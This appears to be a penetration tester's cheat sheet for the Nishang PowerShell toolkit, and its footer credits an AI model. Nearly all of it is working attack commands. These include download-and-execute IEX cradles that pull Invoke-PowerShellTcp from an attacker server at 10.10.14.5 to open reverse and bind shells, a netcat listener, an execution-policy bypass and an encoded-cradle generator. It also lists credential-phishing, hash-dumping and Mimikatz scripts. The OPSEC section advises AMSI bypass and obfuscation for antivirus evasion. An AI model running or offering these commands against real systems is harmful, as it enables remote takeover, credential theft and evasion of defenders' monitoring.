# Nishang

**Tags:** `#nishang` `#powershell` `#webshells` `#payloads` `#reverseShell` `#postexploit`

Collection of PowerShell offensive scripts and payloads for penetration testing. Covers reverse shells, web shells, privilege escalation, persistence, data exfiltration, and more. Pre-installed on Kali — scripts load directly into memory via IEX.

**Source:** https://github.com/samratashok/nishang
**Install:** Pre-installed at `/usr/share/nishang/`

```bash
ls /usr/share/nishang/
# Antak-WebShell/  Backdoors/  Escalation/  Execution/  Gather/  Pivoting/  Shells/  ...
```

> [!note]
> Most scripts are designed to be loaded via `IEX(New-Object Net.WebClient).DownloadString(...)` — serve from Kali HTTP server and execute in-memory to avoid writing to disk.

---

## Key Scripts by Category

### Shells

| Script | Description |
|--------|-------------|
| `Shells/Invoke-PowerShellTcp.ps1` | Reverse/bind TCP shell (most common) |
| `Shells/Invoke-PowerShellUdp.ps1` | UDP-based shell |
| `Shells/Invoke-PoshRatHttp.ps1` | HTTP-based reverse shell |
| `Shells/Invoke-PoshRatHttps.ps1` | HTTPS-based reverse shell |

### Web Shells

| Script | Description |
|--------|-------------|
| `Antak-WebShell/antak.aspx` | Interactive PowerShell web shell (ASPX) |

### Execution / Bypass

| Script | Description |
|--------|-------------|
| `Execution/Execute-Command-MSSQL.ps1` | Execute commands via MSSQL |
| `Execution/Invoke-Decode.ps1` | Decode/deobfuscate scripts |

### Escalation / Post-Exploit

| Script | Description |
|--------|-------------|
| `Escalation/Invoke-PsUACme.ps1` | UAC bypass |
| `Gather/Invoke-CredentialsPhish.ps1` | Credential phishing popup |
| `Gather/Get-PassHashes.ps1` | Dump password hashes |
| `Gather/Invoke-Mimikatz.ps1` | Mimikatz via reflection |

---

## Invoke-PowerShellTcp (Reverse Shell)

**Kali — serve the script:**
```bash
cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 .

# Append the invoke line to the script so it auto-executes on load
echo "Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.5 -Port 443" >> Invoke-PowerShellTcp.ps1

python3 -m http.server 8000
```

**Kali — listener:**
```bash
nc -lvnp 443
```

**On target (one-liner download + execute):**
```powershell
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5:8000/Invoke-PowerShellTcp.ps1')
```

**Or call explicitly (without modifying the script):**
```powershell
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5:8000/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.5 -Port 443
```

---

## Other Useful One-Liners

```powershell
# Bind shell (target listens on port 443)
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5:8000/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Bind -Port 443

# HTTP reverse shell (goes over port 80)
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5:8000/Invoke-PoshRatHttp.ps1'); Invoke-PoshRatHttp -IPAddress 10.10.14.5 -Port 80
```

---

## Execution Policy Bypass

```powershell
# Bypass policy for in-memory execution
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5:8000/Invoke-PowerShellTcp.ps1')"

# Encoded cradle (useful if single quotes break in a web shell)
powershell -ep bypass -enc <base64-encoded-IEX-command>
```

Generate encoded cradle:
```bash
cmd='IEX(New-Object Net.WebClient).DownloadString('"'"'http://10.10.14.5:8000/Invoke-PowerShellTcp.ps1'"'"'); Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.5 -Port 443'
echo -n "$cmd" | iconv -t UTF-16LE | base64 -w 0
```

---

## OPSEC

- In-memory execution (IEX) avoids writing scripts to disk
- PowerShell v5+ logs ScriptBlock content — use AMSI bypass before loading
- HTTPS variant (`Invoke-PoshRatHttps`) encrypts C2 traffic
- Nishang signatures are well-known — obfuscate or modify variable/function names for AV evasion
- See [[Antak]] for the web shell component

---

*Created: 2026-03-13*
*Updated: 2026-03-13*
*Model: claude-sonnet-4-6*
